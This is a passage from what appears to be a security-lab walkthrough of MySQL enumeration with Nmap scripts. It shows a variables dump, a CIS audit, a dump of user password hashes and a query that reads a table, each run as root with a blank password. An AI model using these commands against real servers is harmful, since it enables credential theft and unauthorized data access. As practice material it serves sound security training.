|   max_insert_delayed_threads: 20
|   max_join_size: 18446744073709551615
|   max_length_for_sort_data: 1024
|   max_long_data_size: 16777216
|   max_prepared_stmt_count: 16382
|   max_relay_log_size: 0
|   max_seeks_for_key: 18446744073709551615
|   max_sort_length: 1024
|   max_sp_recursion_depth: 0
|   max_tmp_tables: 32
|   max_user_connections: 0
|   max_write_lock_count: 18446744073709551615
|   metadata_locks_cache_size: 1024
|   min_examined_row_limit: 0
|   multi_range_count: 256
|   myisam_data_pointer_size: 6
|   myisam_max_sort_file_size: 9223372036853727232
|   myisam_mmap_size: 18446744073709551615
|   myisam_recover_options: BACKUP
|   myisam_repair_threads: 1
|   myisam_sort_buffer_size: 8388608
|   myisam_stats_method: nulls_unequal
|   myisam_use_mmap: OFF
|   net_buffer_length: 16384
|   net_read_timeout: 30
|   net_retry_count: 10
|   net_write_timeout: 60
|   new: OFF
|   old: OFF
|   old_alter_table: OFF
|   old_passwords: OFF
|   open_files_limit: 1048576
|   optimizer_prune_level: 1
|   optimizer_search_depth: 62
|   optimizer_switch: index_merge=on,index_merge_union=on,index_merge_sort_union=on,index_merge_intersection=on,engine_condition_pushdown=on
|   performance_schema: OFF
|   performance_schema_events_waits_history_long_size: 10000
|   performance_schema_events_waits_history_size: 10
|   performance_schema_max_cond_classes: 80
|   performance_schema_max_cond_instances: 1000
|   performance_schema_max_file_classes: 50
|   performance_schema_max_file_handles: 32768
|   performance_schema_max_file_instances: 10000
|   performance_schema_max_mutex_classes: 200
|   performance_schema_max_mutex_instances: 1000000
|   performance_schema_max_rwlock_classes: 30
|   performance_schema_max_rwlock_instances: 1000000
|   performance_schema_max_table_handles: 100000
|   performance_schema_max_table_instances: 50000
|   performance_schema_max_thread_classes: 50
|   performance_schema_max_thread_instances: 1000
|   pid_file: /var/run/mysqld/mysqld.pid
|   plugin_dir: /usr/lib/mysql/plugin/
|   port: 3306
|   preload_buffer_size: 32768
|   profiling: OFF
|   profiling_history_size: 15
|   protocol_version: 10
|   proxy_user: 
|   pseudo_slave_mode: OFF
|   pseudo_thread_id: 56
|   query_alloc_block_size: 8192
|   query_cache_limit: 1048576
|   query_cache_min_res_unit: 4096
|   query_cache_size: 16777216
|   query_cache_type: ON
|   query_cache_wlock_invalidate: OFF
|   query_prealloc_size: 8192
|   rand_seed1: 0
|   rand_seed2: 0
|   range_alloc_block_size: 4096
|   read_buffer_size: 131072
|   read_only: OFF
|   read_rnd_buffer_size: 262144
|   relay_log: 
|   relay_log_index: 
|   relay_log_info_file: relay-log.info
|   relay_log_purge: ON
|   relay_log_recovery: OFF
|   relay_log_space_limit: 0
|   report_host: 
|   report_password: 
|   report_port: 3306
|   report_user: 
|   rpl_recovery_rank: 0
|   secure_auth: OFF
|   secure_file_priv: 
|   server_id: 0
|   skip_external_locking: ON
|   skip_name_resolve: OFF
|   skip_networking: OFF
|   skip_show_database: OFF
|   slave_compressed_protocol: OFF
|   slave_exec_mode: STRICT
|   slave_load_tmpdir: /tmp
|   slave_max_allowed_packet: 1073741824
|   slave_net_timeout: 3600
|   slave_skip_errors: OFF
|   slave_transaction_retries: 10
|   slave_type_conversions: 
|   slow_launch_time: 2
|   slow_query_log: OFF
|   slow_query_log_file: /var/lib/mysql/victim-1-slow.log
|   socket: /var/run/mysqld/mysqld.sock
|   sort_buffer_size: 2097152
|   sql_auto_is_null: OFF
|   sql_big_selects: ON
|   sql_big_tables: OFF
|   sql_buffer_result: OFF
|   sql_log_bin: ON
|   sql_log_off: OFF
|   sql_low_priority_updates: OFF
|   sql_max_join_size: 18446744073709551615
|   sql_mode: 
|   sql_notes: ON
|   sql_quote_show_create: ON
|   sql_safe_updates: OFF
|   sql_select_limit: 18446744073709551615
|   sql_slave_skip_counter: 0
|   sql_warnings: OFF
|   ssl_ca: 
|   ssl_capath: 
|   ssl_cert: 
|   ssl_cipher: 
|   ssl_key: 
|   storage_engine: InnoDB
|   stored_program_cache: 256
|   sync_binlog: 0
|   sync_frm: ON
|   sync_master_info: 0
|   sync_relay_log: 0
|   sync_relay_log_info: 0
|   system_time_zone: UTC
|   table_definition_cache: 400
|   table_open_cache: 400
|   thread_cache_size: 8
|   thread_concurrency: 10
|   thread_handling: one-thread-per-connection
|   thread_stack: 196608
|   time_format: %H:%i:%s
|   time_zone: SYSTEM
|   timed_mutexes: OFF
|   timestamp: 1689013200
|   tmp_table_size: 16777216
|   tmpdir: /tmp
|   transaction_alloc_block_size: 8192
|   transaction_prealloc_size: 4096
|   tx_isolation: REPEATABLE-READ
|   unique_checks: ON
|   updatable_views_with_limit: YES
|   version: 5.5.62-0ubuntu0.14.04.1
|   version_comment: (Ubuntu)
|   version_compile_machine: x86_64
|   version_compile_os: debian-linux-gnu
|   wait_timeout: 28800
|_  warning_count: 0
MAC Address: 02:42:C0:19:A9:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds
```


```
root@attackdefense:~# nmap -p3306 --script mysql-audit --script-args mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit' 192.25.169.3
Starting Nmap 7.70 ( https://nmap.org ) at 2023-07-10 18:24 UTC
Nmap scan report for target-1 (192.25.169.3)
Host is up (0.000039s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-audit: 
|   CIS MySQL Benchmarks v1.0.2
|       3.1: Skip symbolic links => FAIL
|       3.2: Logs not on system partition => PASS
|       3.2: Logs not on database partition => PASS
|       4.1: Supported version of MySQL => REVIEW
|         Version: 5.5.62-0ubuntu0.14.04.1
|       4.4: Remove test database => PASS
|       4.5: Change admin account name => PASS
|       4.7: Verify Secure Password Hashes => PASS
|       4.9: Wildcards in user hostname => PASS
|         The following users were found with wildcards in hostname
|           filetest
|           root
|       4.10: No blank passwords => PASS
|         The following users were found having blank/empty passwords
|           root
|       4.11: Anonymous account => PASS
|       5.1: Access to mysql database => REVIEW
|         Verify the following users that have access to the MySQL database
|           user  host
|       5.2: Do not grant FILE privileges to non Admin users => PASS
|         The following users were found having the FILE privilege
|           filetest
|       5.3: Do not grant PROCESS privileges to non Admin users => PASS
|       5.4: Do not grant SUPER privileges to non Admin users => PASS
|       5.5: Do not grant SHUTDOWN privileges to non Admin users => PASS
|       5.6: Do not grant CREATE USER privileges to non Admin users => PASS
|       5.7: Do not grant RELOAD privileges to non Admin users => PASS
|       5.8: Do not grant GRANT privileges to non Admin users => PASS
|       6.2: Disable Load data local => FAIL
|       6.3: Disable old password hashing => FAIL
|       6.4: Safe show database => FAIL
|       6.5: Secure auth => FAIL
|       6.6: Grant tables => FAIL
|       6.7: Skip merge => FAIL
|       6.8: Skip networking => FAIL
|       6.9: Safe user create => FAIL
|       6.10: Skip symbolic links => FAIL
|     
|     Additional information
|       The audit was performed using the db-account: root
|_      The following admin accounts were excluded from the audit: root,debian-sys-maint
MAC Address: 02:42:C0:19:A9:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.36 seconds
```

```
root@attackdefense:~# nmap -p3306 --script mysql-dump-hashes --script-args username='root',password='' 192.25.169.3
Starting Nmap 7.70 ( https://nmap.org ) at 2023-07-10 18:26 UTC
Nmap scan report for target-1 (192.25.169.3)
Host is up (0.000048s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-dump-hashes: 
|   debian-sys-maint:*CDDA79A15EF590ED57BB5933ECD27364809EE90D
|   filetest:*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
|   ultra:*827EC562775DC9CE458689D36687DCED320F34B0
|   guest:*17FD2DDCC01E0E66405FB1BA16F033188D18F646
|   sigver:*027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0
|   udadmin:*E6DEAD2645D88071D28F004A209691AC60A72AC9
|_  sysadmin:*46CFC7938B60837F46B610A2D10C248874555C14
MAC Address: 02:42:C0:19:A9:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.34 seconds
```

```
root@attackdefense:~# nmap -p3306 --script mysql-query --script-args query='select * from books.authors;',username='root',password='' 192.25.169.3
Starting Nmap 7.70 ( https://nmap.org ) at 2023-07-10 18:28 UTC
Nmap scan report for target-1 (192.25.169.3)
Host is up (0.000034s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-query: 
|   id  first_name  last_name  email                        birthdate   added
|   1   Gregoria    Lowe       gutmann.rebekah@example.net  1982-03-09  1983-01-11 11:25:43
|   2   Ona         Anderson   ethelyn02@example.net        1980-06-02  1972-05-05 07:26:52
|   3   Emile       Lakin      rippin.freda@example.com     1979-04-06  2010-05-30 20:03:07
|   4   Raul        Barton     mschiller@example.com        1976-05-06  1979-02-08 12:32:29
|   5   Sofia       Collier    rodrigo34@example.net        1978-06-09  1991-05-01 10:02:54
|   6   Wellington  Fay        jared98@example.com          2011-08-11  1992-05-27 23:20:20
|   7   Garnet      Braun      hickle.howell@example.net    1990-04-27  2010-04-13 09:48:36
|   8   Alessia     Kuphal     skiles.reggie@example.net    1978-04-06  2014-08-22 21:23:00
|   9   Deven       Carroll    savanah.zulauf@example.net   2007-02-15  1998-02-16 11:45:32
|   10  Issac       Stanton    ozella10@example.net         2013-10-13  1976-12-09 13:18:45
|   
|   Query: select * from books.authors;
|_  User: root
MAC Address: 02:42:C0:19:A9:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.32 seconds
```